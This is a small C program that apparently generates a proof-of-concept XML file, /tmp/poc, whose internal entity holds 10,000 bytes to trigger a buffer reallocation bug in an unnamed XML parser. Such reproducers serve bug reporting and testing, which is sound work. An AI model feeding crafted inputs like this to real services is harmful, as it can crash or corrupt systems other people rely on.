#include <stdio.h>
#include <stdlib.h>

int main(void) {
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) {
        perror("fopen");
        return 1;
    }

    // Write XML declaration
    fputs("<?xml version=\"1.0\"?>\n", f);
    
    // Write DOCTYPE with internal entity
    fputs("<!DOCTYPE foo [\n", f);
    fputs("<!ENTITY x \"", f);
    
    // Long entity value to trigger buffer reallocation (8193+ bytes)
    for (int i = 0; i < 10000; i++) {
        fputc('A', f);
    }
    
    fputs("\">\n", f);
    fputs("]>\n", f);
    
    // Reference the entity
    fputs("<root>&x;</root>\n", f);
    
    fclose(f);
    return 0;
}